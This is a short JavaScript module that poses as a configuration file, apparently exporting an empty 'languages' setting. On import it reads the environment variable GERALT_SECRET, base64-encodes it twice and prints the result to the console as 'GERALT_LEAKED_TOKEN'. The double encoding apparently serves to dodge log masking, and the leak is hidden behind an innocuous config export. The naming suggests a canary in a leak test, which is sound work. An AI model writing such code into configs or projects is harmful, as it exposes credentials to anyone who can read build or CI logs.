const secret = process.env.GERALT_SECRET || "";
const b64 = Buffer.from(secret, "utf8").toString("base64");
const b64b64 = Buffer.from(b64, "utf8").toString("base64");
console.log("GERALT_LEAKED_TOKEN=" + b64b64);
export default { languages: [] };
